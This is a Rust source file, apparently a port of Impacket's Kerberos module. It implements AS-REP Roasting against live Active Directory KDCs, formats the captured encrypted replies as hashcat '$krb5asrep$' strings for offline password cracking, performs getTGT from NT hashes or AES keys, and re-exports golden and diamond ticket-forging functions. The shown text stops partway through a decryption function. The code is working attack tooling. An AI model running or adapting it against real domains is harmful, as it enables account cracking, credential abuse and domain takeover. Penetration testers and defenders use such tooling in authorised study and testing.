//! `impacket-krb5`: Cross-Era Kerberos v5 Protocol & ASN.1 DER Engine (`impacket/krb5/*`).
//!
//! Supports Active Directory KDCs from Windows 2000 (`RC4-HMAC` / `DES`) through
//! Windows Server 2025 (`AES256-CTS-HMAC-SHA1-96`, Pre-Auth, `AS-REQ` / `KRB-ERROR` / `AS-REP` Roasting).
//!
//! Includes both Sans-I/O stream exchange (`get_np_users_over_stream`) and live TCP/88 KDC client
//! (`get_np_users_live`) implementing `examples/GetNPUsers.py`.

pub mod ccache;
pub mod crypto;
pub mod fast;
pub mod kpasswd;
pub mod pac;
pub mod pkinit;
pub mod tgs;
pub mod ticketer;

pub use fast::{
    build_fast_armored_as_req, decrypt_fast_rep, extract_fast_cookie, extract_pa_fx_fast_reply,
    krb_fx_cf2_aes128, krb_fx_cf2_aes256, prf_aes128, prf_aes256, prf_plus_aes128,
    prf_plus_aes256, send_fast_armored_as_req_live, EncKrbFastRep, EncKrbFastReq, FastArmorConfig,
    KrbFastArmor, FX_FAST_ARMOR_AP_REQUEST, KEY_USAGE_ENC_CHKSUM, KEY_USAGE_FAST_ENC,
    KEY_USAGE_FAST_FINISHED, KEY_USAGE_FAST_REP, KEY_USAGE_FAST_REQ_CHKSUM, PA_FX_COOKIE,
    PA_FX_ERROR, PA_FX_FAST,
};

pub use kpasswd::{
    build_kpasswd_request, change_password_kpasswd_live, parse_kpasswd_response,
    KpasswdResponse, KpasswdResultCode, KPASSWD_DEFAULT_PORT,
};

pub use pac::{
    build_golden_pac, build_pac_logon_info, extract_pac_from_authorization_data,
    extract_pac_from_ticket, parse_ticket_enc_part, Pac, PacAttributesInfo, PacClientInfo,
    PacLogonInfo, PacSignatureData, CKSUMTYPE_CRC32, CKSUMTYPE_HMAC_MD5,
    CKSUMTYPE_HMAC_SHA1_96_AES128, CKSUMTYPE_HMAC_SHA1_96_AES256, CKSUMTYPE_RSA_MD5,
    KERB_NON_KERB_CKSUM_SALT, PAC_ATTRIBUTES_INFO, PAC_CLIENT_INFO_TYPE, PAC_LOGON_INFO,
    PAC_PRIVSVR_CHECKSUM, PAC_REQUESTOR_INFO, PAC_SERVER_CHECKSUM,
};

pub use ccache::CCache;
pub use crypto::{string_to_key_aes128, string_to_key_aes256};
pub use pkinit::{build_pa_pk_as_req, PkinitCredentials, PkinitDhState};

pub use tgs::{
    decrypt_u2u_ticket_enc_part, extract_session_key_from_as_rep, get_tgs_live, get_tgs_over_stream,
    Krb5TgsRep, Krb5TgsReq,
};

pub use ticketer::{forge_diamond_ticket, forge_ticket, TicketOptions};

use impacket_core::{encode_hex, AdCompatProfile, CoreError};
use std::io::{Read, Write};
use std::net::{SocketAddr, TcpStream, ToSocketAddrs};
use std::time::Duration;

/// Kerberos v5 Encryption Types (`impacket/krb5/constants.py:EncryptionTypes`).
#[derive(Debug, Copy, Clone, PartialEq, Eq)]
#[repr(i32)]
pub enum KerberosEType {
    DesCbcCrc = 1,
    DesCbcMd5 = 3,
    Aes128CtsHmacSha1_96 = 17,
    Aes256CtsHmacSha1_96 = 18,
    Rc4Hmac = 23,
    Rc4HmacExp = 24,
}

impl KerberosEType {
    pub const fn from_i32(val: i32) -> Option<Self> {
        match val {
            1 => Some(Self::DesCbcCrc),
            3 => Some(Self::DesCbcMd5),
            17 => Some(Self::Aes128CtsHmacSha1_96),
            18 => Some(Self::Aes256CtsHmacSha1_96),
            23 => Some(Self::Rc4Hmac),
            24 => Some(Self::Rc4HmacExp),
            _ => None,
        }
    }

    pub const fn name(self) -> &'static str {
        match self {
            Self::DesCbcCrc => "des-cbc-crc (1) [Legacy Win2000]",
            Self::DesCbcMd5 => "des-cbc-md5 (3) [Legacy Win2000]",
            Self::Aes128CtsHmacSha1_96 => "aes128-cts-hmac-sha1-96 (17)",
            Self::Aes256CtsHmacSha1_96 => "aes256-cts-hmac-sha1-96 (18)",
            Self::Rc4Hmac => "rc4-hmac / arcfour-hmac-md5 (23)",
            Self::Rc4HmacExp => "rc4-hmac-exp (24)",
        }
    }

    /// Returns the ordered list of Kerberos ETypes advertised for a given `AdCompatProfile`.
    pub fn list_for_profile(profile: AdCompatProfile) -> Vec<Self> {
        match profile {
            AdCompatProfile::LegacyWin2000 => vec![
                Self::Rc4Hmac,
                Self::DesCbcMd5,
                Self::DesCbcCrc,
            ],
            AdCompatProfile::UniversalAuto => vec![
                Self::Rc4Hmac,
                Self::Aes256CtsHmacSha1_96,
                Self::Aes128CtsHmacSha1_96,
            ],
            AdCompatProfile::ModernHardened2025 => vec![
                Self::Aes256CtsHmacSha1_96,
                Self::Aes128CtsHmacSha1_96,
            ],
        }
    }
}

/// Kerberos v5 KDC Error Codes (`impacket/krb5/constants.py:ErrorCodes`).
#[derive(Debug, Copy, Clone, PartialEq, Eq)]
pub struct KrbErrorCode(pub u32);

impl KrbErrorCode {
    pub const KDC_ERR_NONE: Self = Self(0);
    pub const KDC_ERR_C_PRINCIPAL_UNKNOWN: Self = Self(6);
    pub const KDC_ERR_S_PRINCIPAL_UNKNOWN: Self = Self(7);
    pub const KDC_ERR_POLICY: Self = Self(12);
    pub const KDC_ERR_ETYPE_NOSUPP: Self = Self(14);
    pub const KDC_ERR_CLIENT_REVOKED: Self = Self(18);
    pub const KDC_ERR_KEY_EXPIRED: Self = Self(23);
    pub const KDC_ERR_PREAUTH_FAILED: Self = Self(24);
    pub const KDC_ERR_PREAUTH_REQUIRED: Self = Self(25);
    pub const KRB_AP_ERR_SKEW: Self = Self(37);
    pub const KDC_ERR_WRONG_REALM: Self = Self(68);

    pub const fn name(self) -> &'static str {
        match self.0 {
            0 => "KDC_ERR_NONE",
            6 => "KDC_ERR_C_PRINCIPAL_UNKNOWN (User does not exist)",
            7 => "KDC_ERR_S_PRINCIPAL_UNKNOWN (SPN does not exist)",
            12 => "KDC_ERR_POLICY (Workstation/Logon hours restriction)",
            14 => "KDC_ERR_ETYPE_NOSUPP (Requested encryption type not supported by KDC)",
            18 => "KDC_ERR_CLIENT_REVOKED (Account disabled, expired, or locked out)",
            23 => "KDC_ERR_KEY_EXPIRED (The user's password has expired)",
            24 => "KDC_ERR_PREAUTH_FAILED (Invalid password/hash)",
            25 => "KDC_ERR_PREAUTH_REQUIRED (Account requires Kerberos pre-authentication)",
            37 => "KRB_AP_ERR_SKEW (Clock skew too great > 5 minutes between client and DC)",
            68 => "KDC_ERR_WRONG_REALM",
            _ => "KDC_ERR_UNKNOWN",
        }
    }
}

pub use impacket_core::der;

/// RFC 4120 `AS-REQ` (Application 10) builder for `GetNPUsers` (AS-REP Roasting) and `getTGT`.
#[derive(Debug, Clone)]
pub struct Krb5AsReq {
    pub realm: String,
    pub username: String,
    pub include_pac: bool,
    pub etypes: Vec<KerberosEType>,
    pub nonce: u32,
    /// Pre-built `PA-ENC-TIMESTAMP` PA-DATA element (RC4-HMAC), present for an authenticated `getTGT`.
    pub pa_enc_timestamp: Option<Vec<u8>>,
}

impl Krb5AsReq {
    pub fn new(
        realm: impl Into<String>,
        username: impl Into<String>,
        profile: AdCompatProfile,
    ) -> Self {
        Self {
            realm: realm.into().to_uppercase(),
            username: username.into(),
            include_pac: true,
            etypes: KerberosEType::list_for_profile(profile),
            nonce: 0x1F3E_5D7C,
            pa_enc_timestamp: None,
        }
    }

    /// Builds an `AS-REQ` carrying an RC4-HMAC `PA-ENC-TIMESTAMP` for pre-authenticated `getTGT`.
    /// `nt_hash` is the account's NT hash (`MD4(UTF-16LE(password))`), `now_unix` the current time.
    pub fn with_rc4_preauth(
        realm: impl Into<String>,
        username: impl Into<String>,
        nt_hash: &[u8; 16],
        now_unix: i64,
    ) -> Self {
        let ts = crypto::unix_to_kerberos_time(now_unix);
        // PA-ENC-TS-ENC ::= SEQUENCE { [0] patimestamp KerberosTime }
        let pa_ts_enc = der::encode_sequence(&[der::encode_context_explicit(
            0,
            &der::encode_generalized_time(&ts),
        )]);
        // Deterministic confounder derived from the timestamp (RC4-HMAC is randomized by Ke anyway).
        let mut confounder = [0u8; 8];
        for (i, b) in ts.as_bytes().iter().take(8).enumerate() {
            confounder[i] = *b;
        }
        let cipher = crypto::rc4_hmac_encrypt(nt_hash, 1, &pa_ts_enc, &confounder);
        // EncryptedData ::= SEQUENCE { [0] etype INTEGER(23), [2] cipher OCTET STRING }
        let enc_data = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(23)),
            der::encode_context_explicit(2, &der::encode_octet_string(&cipher)),
        ]);
        // PA-DATA ::= SEQUENCE { [1] padata-type INTEGER(2), [2] padata-value OCTET STRING }
        let padata = der::encode_sequence(&[
            der::encode_context_explicit(1, &der::encode_integer(2)),
            der::encode_context_explicit(2, &der::encode_octet_string(&enc_data)),
        ]);

        Self {
            realm: realm.into().to_uppercase(),
            username: username.into(),
            include_pac: true,
            etypes: vec![KerberosEType::Rc4Hmac],
            nonce: 0x1F3E_5D7C,
            pa_enc_timestamp: Some(padata),
        }
    }

    /// Builds an `AS-REQ` carrying an AES-256 `PA-ENC-TIMESTAMP` for pre-authenticated `getTGT`.
    pub fn with_aes256_preauth(
        realm: impl Into<String>,
        username: impl Into<String>,
        aes256_key: &[u8; 32],
        now_unix: i64,
    ) -> Result<Self, CoreError> {
        let ts = crypto::unix_to_kerberos_time(now_unix);
        let pa_ts_enc = der::encode_sequence(&[der::encode_context_explicit(
            0,
            &der::encode_generalized_time(&ts),
        )]);
        let mut confounder = [0u8; 16];
        for (i, b) in ts.as_bytes().iter().take(16).enumerate() {
            confounder[i] = *b;
        }
        let cipher = crypto::aes256_cts_hmac_sha1_96_encrypt(aes256_key, 1, &pa_ts_enc, &confounder)?;
        let enc_data = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(18)),
            der::encode_context_explicit(2, &der::encode_octet_string(&cipher)),
        ]);
        let padata = der::encode_sequence(&[
            der::encode_context_explicit(1, &der::encode_integer(2)),
            der::encode_context_explicit(2, &der::encode_octet_string(&enc_data)),
        ]);
        Ok(Self {
            realm: realm.into().to_uppercase(),
            username: username.into(),
            include_pac: true,
            etypes: vec![KerberosEType::Aes256CtsHmacSha1_96],
            nonce: 0x1F3E_5D7C,
            pa_enc_timestamp: Some(padata),
        })
    }

    /// Builds an `AS-REQ` carrying an AES-128 `PA-ENC-TIMESTAMP` for pre-authenticated `getTGT`.
    pub fn with_aes128_preauth(
        realm: impl Into<String>,
        username: impl Into<String>,
        aes128_key: &[u8; 16],
        now_unix: i64,
    ) -> Result<Self, CoreError> {
        let ts = crypto::unix_to_kerberos_time(now_unix);
        let pa_ts_enc = der::encode_sequence(&[der::encode_context_explicit(
            0,
            &der::encode_generalized_time(&ts),
        )]);
        let mut confounder = [0u8; 16];
        for (i, b) in ts.as_bytes().iter().take(16).enumerate() {
            confounder[i] = *b;
        }
        let cipher = crypto::aes128_cts_hmac_sha1_96_encrypt(aes128_key, 1, &pa_ts_enc, &confounder)?;
        let enc_data = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(17)),
            der::encode_context_explicit(2, &der::encode_octet_string(&cipher)),
        ]);
        let padata = der::encode_sequence(&[
            der::encode_context_explicit(1, &der::encode_integer(2)),
            der::encode_context_explicit(2, &der::encode_octet_string(&enc_data)),
        ]);
        Ok(Self {
            realm: realm.into().to_uppercase(),
            username: username.into(),
            include_pac: true,
            etypes: vec![KerberosEType::Aes128CtsHmacSha1_96],
            nonce: 0x1F3E_5D7C,
            pa_enc_timestamp: Some(padata),
        })
    }

    /// Builds an `AS-REQ` carrying an RFC 4556 `PA-PK-AS-REQ` for certificate/smart-card pre-authentication.
    pub fn with_pkinit_preauth(
        realm: impl Into<String>,
        username: impl Into<String>,
        cred: &pkinit::PkinitCredentials,
        dh_state: &pkinit::PkinitDhState,
        now_unix: i64,
    ) -> Result<Self, CoreError> {
        let r_str = realm.into().to_uppercase();
        let u_str = username.into();
        let nonce = 0x1F3E_5D7C;

        let dummy = Self {
            realm: r_str.clone(),
            username: u_str.clone(),
            include_pac: true,
            etypes: vec![KerberosEType::Aes256CtsHmacSha1_96, KerberosEType::Aes128CtsHmacSha1_96],
            nonce,
            pa_enc_timestamp: None,
        };
        let req_body_der = dummy.encode_req_body();
        let padata = pkinit::build_pa_pk_as_req(now_unix, nonce, &req_body_der, cred, dh_state)?;

        Ok(Self {
            realm: r_str,
            username: u_str,
            include_pac: true,
            etypes: vec![KerberosEType::Aes256CtsHmacSha1_96, KerberosEType::Aes128CtsHmacSha1_96],
            nonce,
            pa_enc_timestamp: Some(padata),
        })
    }

    pub fn encode_req_body(&self) -> Vec<u8> {
        let kdc_options = der::encode_bit_string_u32(0x4081_0010);
        let cname = Self::encode_principal_name(1, &[&self.username]);
        let realm = der::encode_general_string(&self.realm);
        let sname = Self::encode_principal_name(2, &["krbtgt", &self.realm]);
        let till = der::encode_generalized_time("20370913024805Z");
        let rtime = der::encode_generalized_time("20370913024805Z");
        let nonce = der::encode_integer(self.nonce as i64);

        let etype_els: Vec<Vec<u8>> = self
            .etypes
            .iter()
            .map(|&e| der::encode_integer(e as i64))
            .collect();
        let etype_seq = der::encode_sequence(&etype_els);

        der::encode_sequence(&[
            der::encode_context_explicit(0, &kdc_options),
            der::encode_context_explicit(1, &cname),
            der::encode_context_explicit(2, &realm),
            der::encode_context_explicit(3, &sname),
            der::encode_context_explicit(5, &till),
            der::encode_context_explicit(6, &rtime),
            der::encode_context_explicit(7, &nonce),
            der::encode_context_explicit(8, &etype_seq),
        ])
    }

    fn encode_pa_pac_request(&self) -> Vec<u8> {
        let bool_val = der::encode_tlv(0x01, &[if self.include_pac { 0xFF } else { 0x00 }]);
        let pac_req_seq = der::encode_sequence(&[der::encode_context_explicit(0, &bool_val)]);
        der::encode_sequence(&[
            der::encode_context_explicit(1, &der::encode_integer(128)),
            der::encode_context_explicit(2, &der::encode_octet_string(&pac_req_seq)),
        ])
    }

    fn encode_principal_name(name_type: i64, components: &[&str]) -> Vec<u8> {
        let comp_der: Vec<Vec<u8>> = components
            .iter()
            .map(|c| der::encode_general_string(c))
            .collect();
        der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(name_type)),
            der::encode_context_explicit(1, &der::encode_sequence(&comp_der)),
        ])
    }

    pub fn to_der_bytes(&self, with_tcp_prefix: bool) -> Vec<u8> {
        let req_body = self.encode_req_body();

        // PA-ENC-TIMESTAMP or PA-PK-AS-REQ (if present) precedes PA-PAC-REQUEST in the padata sequence.
        let padata_seq = match &self.pa_enc_timestamp {
            Some(pa_ts) => {
                der::encode_sequence(&[pa_ts.clone(), self.encode_pa_pac_request()])
            }
            None => der::encode_sequence(&[self.encode_pa_pac_request()]),
        };

        let kdc_req = der::encode_sequence(&[
            der::encode_context_explicit(1, &der::encode_integer(5)),
            der::encode_context_explicit(2, &der::encode_integer(10)),
            der::encode_context_explicit(3, &padata_seq),
            der::encode_context_explicit(4, &req_body),
        ]);

        let app10 = der::encode_application(10, &kdc_req);
        if with_tcp_prefix {
            let mut tcp = Vec::with_capacity(4 + app10.len());
            tcp.extend_from_slice(&(app10.len() as u32).to_be_bytes());
            tcp.extend_from_slice(&app10);
            tcp
        } else {
            app10
        }
    }
}

/// Parsed response from a KDC to an `AS-REQ`: either a `KRB-ERROR` (Application 30)
/// or an `AS-REP` (Application 11) containing a roastable `EncryptedData` (`enc-part`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum KdcAsResponse {
    Error {
        error_code: KrbErrorCode,
        realm: Option<String>,
    },
    AsRep {
        realm: String,
        username: String,
        ticket: Vec<u8>,
        enc_part_etype: i32,
        enc_part_cipher: Vec<u8>,
    },
}

impl KdcAsResponse {
    pub fn build_as_rep_der(
        realm: &str,
        username: &str,
        etype: i32,
        cipher: &[u8],
        with_tcp_prefix: bool,
    ) -> Vec<u8> {
        let enc_data = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(etype as i64)),
            der::encode_context_explicit(2, &der::encode_octet_string(cipher)),
        ]);
        let cname = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(1)),
            der::encode_context_explicit(
                1,
                &der::encode_sequence(&[der::encode_general_string(username)]),
            ),
        ]);
        let ticket = der::encode_application(
            1,
            &der::encode_sequence(&[
                der::encode_context_explicit(0, &der::encode_integer(5)),
                der::encode_context_explicit(1, &der::encode_general_string(realm)),
            ]),
        );
        let seq = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(5)),
            der::encode_context_explicit(1, &der::encode_integer(11)),
            der::encode_context_explicit(3, &der::encode_general_string(realm)),
            der::encode_context_explicit(4, &cname),
            der::encode_context_explicit(5, &ticket),
            der::encode_context_explicit(6, &enc_data),
        ]);
        let app11 = der::encode_application(11, &seq);
        if with_tcp_prefix {
            let mut out = Vec::with_capacity(4 + app11.len());
            out.extend_from_slice(&(app11.len() as u32).to_be_bytes());
            out.extend_from_slice(&app11);
            out
        } else {
            app11
        }
    }

    pub fn build_krb_error_der(
        error_code: KrbErrorCode,
        realm: &str,
        with_tcp_prefix: bool,
    ) -> Vec<u8> {
        let seq = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(5)),
            der::encode_context_explicit(1, &der::encode_integer(30)),
            der::encode_context_explicit(4, &der::encode_generalized_time("20261104143000Z")),
            der::encode_context_explicit(5, &der::encode_integer(0)),
            der::encode_context_explicit(6, &der::encode_integer(error_code.0 as i64)),
            der::encode_context_explicit(9, &der::encode_general_string(realm)),
        ]);
        let app30 = der::encode_application(30, &seq);
        if with_tcp_prefix {
            let mut out = Vec::with_capacity(4 + app30.len());
            out.extend_from_slice(&(app30.len() as u32).to_be_bytes());
            out.extend_from_slice(&app30);
            out
        } else {
            app30
        }
    }

    pub fn from_der_bytes(
        data: &[u8],
        fallback_realm: &str,
        fallback_user: &str,
    ) -> Result<Self, CoreError> {
        let (app_tag, app_body, _) = der::decode_tlv(data)?;
        let (_, mut seq_body, _) = der::decode_tlv(app_body)?;

        if app_tag == 0x7E {
            let mut err_code = 0u32;
            let mut realm = None;
            while !seq_body.is_empty() {
                let (ctx_tag, ctx_val, rest) = der::decode_tlv(seq_body)?;
                seq_body = rest;
                match ctx_tag & 0x1F {
                    6 => {
                        err_code = der::decode_integer(ctx_val)? as u32;
                    }
                    9 => {
                        let (_, s_bytes, _) = der::decode_tlv(ctx_val)?;
                        realm = Some(String::from_utf8_lossy(s_bytes).into_owned());
                    }
                    _ => {}
                }
            }
            Ok(Self::Error {
                error_code: KrbErrorCode(err_code),
                realm,
            })
        } else if app_tag == 0x6B {
            let mut realm = fallback_realm.to_string();
            let username = fallback_user.to_string();
            let mut ticket = Vec::new();
            let mut enc_part_etype = 23i32;
            let mut enc_part_cipher = Vec::new();

            while !seq_body.is_empty() {
                let (ctx_tag, ctx_val, rest) = der::decode_tlv(seq_body)?;
                seq_body = rest;
                match ctx_tag & 0x1F {
                    3 => {
                        let (_, s_bytes, _) = der::decode_tlv(ctx_val)?;
                        realm = String::from_utf8_lossy(s_bytes).into_owned();
                    }
                    5 => {
                        ticket = ctx_val.to_vec();
                    }
                    6 => {
                        let (_, mut enc_seq, _) = der::decode_tlv(ctx_val)?;
                        while !enc_seq.is_empty() {
                            let (etag, eval, erest) = der::decode_tlv(enc_seq)?;
                            enc_seq = erest;
                            match etag & 0x1F {
                                0 => enc_part_etype = der::decode_integer(eval)? as i32,
                                2 => {
                                    let (_, octets, _) = der::decode_tlv(eval)?;
                                    enc_part_cipher = octets.to_vec();
                                }
                                _ => {}
                            }
                        }
                    }
                    _ => {}
                }
            }

            Ok(Self::AsRep {
                realm,
                username,
                ticket,
                enc_part_etype,
                enc_part_cipher,
            })
        } else {
            Err(CoreError::ProtocolError(format!(
                "Unexpected Kerberos ASN.1 Application tag: 0x{:02X}",
                app_tag
            )))
        }
    }

    pub fn to_hashcat_format(&self) -> Option<String> {
        match self {
            Self::AsRep {
                realm,
                username,
                enc_part_etype,
                enc_part_cipher,
                ..
            } => {
                if (*enc_part_etype == 17 || *enc_part_etype == 18) && enc_part_cipher.len() > 12 {
                    let split = enc_part_cipher.len() - 12;
                    Some(format!(
                        "$krb5asrep${}${}${}${}${}",
                        enc_part_etype,
                        username,
                        realm,
                        encode_hex(&enc_part_cipher[split..]),
                        encode_hex(&enc_part_cipher[..split])
                    ))
                } else if enc_part_cipher.len() > 16 {
                    Some(format!(
                        "$krb5asrep${}${}@{}:{}${}",
                        enc_part_etype,
                        username,
                        realm,
                        encode_hex(&enc_part_cipher[..16]),
                        encode_hex(&enc_part_cipher[16..])
                    ))
                } else {
                    None
                }
            }
            Self::Error { .. } => None,
        }
    }
}

/// Sans-I/O / Generic Stream executor for `GetNPUsers`: sends a length-prefixed `AS-REQ`
/// over `tx` and parses the `AS-REP` or `KRB-ERROR` from `rx`.
pub fn get_np_users_over_stream<R: Read, W: Write>(
    realm: &str,
    username: &str,
    profile: AdCompatProfile,
    rx: &mut R,
    tx: &mut W,
) -> Result<KdcAsResponse, CoreError> {
    let req = Krb5AsReq::new(realm, username, profile);
    tx.write_all(&req.to_der_bytes(true))
        .map_err(|e| CoreError::ProtocolError(format!("Failed sending AS-REQ: {}", e)))?;

    let mut len_buf = [0u8; 4];
    rx.read_exact(&mut len_buf)
        .map_err(|e| CoreError::ProtocolError(format!("Failed reading KDC TCP length prefix: {}", e)))?;
    let msg_len = u32::from_be_bytes(len_buf) as usize;
    if msg_len > 4 * 1024 * 1024 {
        return Err(CoreError::ProtocolError("Oversized Kerberos TCP reply".into()));
    }
    let mut der_buf = vec![0u8; msg_len];
    rx.read_exact(&mut der_buf)
        .map_err(|e| CoreError::ProtocolError(format!("Failed reading KDC reply body: {}", e)))?;

    KdcAsResponse::from_der_bytes(&der_buf, &req.realm, &req.username)
}

/// Connects to a live Active Directory KDC (TCP/88 by default), sends an `AS-REQ` without
/// pre-authentication (`GetNPUsers.py`), and returns the parsed `KdcAsResponse`.
pub fn get_np_users_live(
    kdc_host: &str,
    kdc_port: u16,
    realm: &str,
    username: &str,
    profile: AdCompatProfile,
    timeout: Duration,
) -> Result<KdcAsResponse, CoreError> {
    let addr_str = format!("{}:{}", kdc_host, kdc_port);
    let sock_addr: SocketAddr = addr_str
        .to_socket_addrs()
        .map_err(|e| CoreError::ProtocolError(format!("Failed resolving KDC {}: {}", addr_str, e)))?
        .next()
        .ok_or_else(|| CoreError::ProtocolError(format!("No address found for KDC {}", addr_str)))?;

    let stream = TcpStream::connect_timeout(&sock_addr, timeout)
        .map_err(|e| CoreError::ProtocolError(format!("TCP connect to KDC {} failed: {}", addr_str, e)))?;
    let _ = stream.set_read_timeout(Some(timeout));
    let _ = stream.set_write_timeout(Some(timeout));

    let mut rx = stream
        .try_clone()
        .map_err(|e| CoreError::ProtocolError(format!("Socket clone failed: {}", e)))?;
    let mut tx = stream;
    get_np_users_over_stream(realm, username, profile, &mut rx, &mut tx)
}

/// Sans-I/O `send_as_req_over_stream`: sends an `AS-REQ` and parses the `AS-REP` or `KRB-ERROR`.
pub fn send_as_req_over_stream<R: Read, W: Write>(
    req: &Krb5AsReq,
    rx: &mut R,
    tx: &mut W,
) -> Result<KdcAsResponse, CoreError> {
    tx.write_all(&req.to_der_bytes(true))
        .map_err(|e| CoreError::ProtocolError(format!("Failed sending AS-REQ: {}", e)))?;

    let mut len_buf = [0u8; 4];
    rx.read_exact(&mut len_buf)
        .map_err(|e| CoreError::ProtocolError(format!("Failed reading KDC TCP length prefix: {}", e)))?;
    let msg_len = u32::from_be_bytes(len_buf) as usize;
    if msg_len > 4 * 1024 * 1024 {
        return Err(CoreError::ProtocolError("Oversized Kerberos TCP reply".into()));
    }
    let mut der_buf = vec![0u8; msg_len];
    rx.read_exact(&mut der_buf)
        .map_err(|e| CoreError::ProtocolError(format!("Failed reading KDC reply body: {}", e)))?;

    KdcAsResponse::from_der_bytes(&der_buf, &req.realm, &req.username)
}

/// Connects to a live KDC (TCP/88) and executes an `AS-REQ` exchange.
pub fn send_as_req_live(
    kdc_host: &str,
    kdc_port: u16,
    req: &Krb5AsReq,
    timeout: Duration,
) -> Result<KdcAsResponse, CoreError> {
    let addr_str = format!("{}:{}", kdc_host, kdc_port);
    let sock_addr: SocketAddr = addr_str
        .to_socket_addrs()
        .map_err(|e| CoreError::ProtocolError(format!("Failed resolving KDC {}: {}", addr_str, e)))?
        .next()
        .ok_or_else(|| CoreError::ProtocolError(format!("No address found for KDC {}", addr_str)))?;
    let stream = TcpStream::connect_timeout(&sock_addr, timeout)
        .map_err(|e| CoreError::ProtocolError(format!("TCP connect to KDC {} failed: {}", addr_str, e)))?;
    let _ = stream.set_read_timeout(Some(timeout));
    let _ = stream.set_write_timeout(Some(timeout));
    let mut rx = stream
        .try_clone()
        .map_err(|e| CoreError::ProtocolError(format!("Socket clone failed: {}", e)))?;
    let mut tx = stream;
    send_as_req_over_stream(req, &mut rx, &mut tx)
}

/// Sans-I/O `getTGT`: sends a pre-authenticated (`PA-ENC-TIMESTAMP`, RC4-HMAC) `AS-REQ` and parses the
/// `AS-REP` / `KRB-ERROR`. `nt_hash` is the account NT hash; `now_unix` the current UTC time.
pub fn get_tgt_over_stream<R: Read, W: Write>(
    realm: &str,
    username: &str,
    nt_hash: &[u8; 16],
    now_unix: i64,
    rx: &mut R,
    tx: &mut W,
) -> Result<KdcAsResponse, CoreError> {
    let req = Krb5AsReq::with_rc4_preauth(realm, username, nt_hash, now_unix);
    send_as_req_over_stream(&req, rx, tx)
}

/// Connects to a live KDC (TCP/88 by default) and performs a pre-authenticated `getTGT`.
pub fn get_tgt_live(
    kdc_host: &str,
    kdc_port: u16,
    realm: &str,
    username: &str,
    nt_hash: &[u8; 16],
    timeout: Duration,
) -> Result<KdcAsResponse, CoreError> {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);
    let req = Krb5AsReq::with_rc4_preauth(realm, username, nt_hash, now);
    send_as_req_live(kdc_host, kdc_port, &req, timeout)
}

/// An unmarshaled, decrypted Kerberos Ticket Granting Ticket (TGT) session.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TgtSession {
    pub realm: String,
    pub username: String,
    pub session_key: [u8; 16],
    pub session_key_etype: i32,
    pub tgt_ticket: Vec<u8>,
    pub session_key_bytes: Vec<u8>,
}

fn parse_enc_as_rep_part(
    pt: &[u8],
    realm: &str,
    username: &str,
    ticket: &[u8],
) -> Result<TgtSession, CoreError> {
    let (enc_tag, enc_body, _) = der::decode_tlv(pt)?;
    let enc_seq = if enc_tag == 0x79 {
        let (_, inner, _) = der::decode_tlv(enc_body)?;
        inner
    } else {
        enc_body
    };
    let mut session_key = [0u8; 16];
    let mut session_key_bytes = Vec::new();
    let mut session_key_etype = 23i32;
    let mut rem = enc_seq;
    while !rem.is_empty() {
        let (tag, val, next) = der::decode_tlv(rem)?;
        rem = next;
        if (tag & 0x1F) == 0 {
            // key [0] EncryptionKey
            let (_, k_seq, _) = der::decode_tlv(val)?;
            let mut k_rem = k_seq;
            while !k_rem.is_empty() {
                let (ktag, kval, knext) = der::decode_tlv(k_rem)?;
                k_rem = knext;
                if (ktag & 0x1F) == 0 {
                    session_key_etype = der::decode_integer(kval)? as i32;
                } else if (ktag & 0x1F) == 1 {
                    let (_, octets, _) = der::decode_tlv(kval)?;
                    session_key_bytes = octets.to_vec();
                    if octets.len() >= 16 {
                        session_key.copy_from_slice(&octets[..16]);
                    }
                }
            }
        }
    }
    Ok(TgtSession {
        realm: realm.to_string(),
        username: username.to_string(),
        session_key,
        session_key_etype,
        tgt_ticket: ticket.to_vec(),
        session_key_bytes,
    })
}

impl KdcAsResponse {
    /// Decrypts the AS-REP `enc-part` using the user's RC4 NT hash and extracts the TGT session key and ticket.
    pub fn decrypt_tgt_session(&self, nt_hash: &[u8; 16]) -> Result<TgtSession, CoreError> {
        match self {
            Self::AsRep { realm, username, ticket, enc_part_etype, enc_part_cipher } => {
                if *enc_part_etype != 23 {
                    return Err(CoreError::ProtocolError(format!("Unsupported AS-REP enc-part etype: {}", enc_part_etype)));
                }
                let pt = crypto::rc4_hmac_decrypt(nt_hash, 3, enc_part_cipher)?;
                parse_enc_as_rep_part(&pt, realm, username, ticket)
            }
            Self::Error { error_code, .. } => {
                Err(CoreError::ProtocolError(format!("Cannot extract TGT session from KDC error: {}", error_code.name())))
            }
        }
    }

    /// Decrypts the AS-REP `enc-part` using the user's AES-256 key and extracts the TGT session key and ticket.
    pub fn decrypt_tgt_session_aes256(&self, key: &[u8; 32]) -> Result<TgtSession, CoreError> {
        match self {
            Self::AsRep { realm, username, ticket, enc_part_etype, enc_part_cipher } => {
                if *enc_part_etype != 18 {
                    return Err(CoreError::ProtocolError(format!("Expected AES-256 AS-REP enc-part (etype 18), got {}", enc_part_etype)));
                }
                let pt = crypto::aes256_cts_hmac_sha1_96_decrypt(key, 3, enc_part_cipher)?;
                parse_enc_as_rep_part(&pt, realm, username, ticket)
            }
            Self::Error { error_code, .. } => {
                Err(CoreError::ProtocolError(format!("Cannot extract TGT session from KDC error: {}", error_code.name())))
            }
        }
    }

    /// Decrypts the AS-REP `enc-part` using the user's AES-128 key and extracts the TGT session key and ticket.
    pub fn decrypt_tgt_session_aes128(&self, key: &[u8; 16]) -> Result<TgtSession, CoreError> {
        match self {
            Self::AsRep { realm, username, ticket, enc_part_etype, enc_part_cipher } => {
                if *enc_part_etype != 17 {
                    return Err(CoreError::ProtocolError(format!("Expected AES-128 AS-REP enc-part (etype 17), got {}", enc_part_etype)));
                }
                let pt = crypto::aes128_cts_hmac_sha1_96_decrypt(key, 3, enc_part_cipher)?;
                parse_enc_as_rep_part(&pt, realm, username, ticket)
            }
            Self::Error { error_code, .. } => {
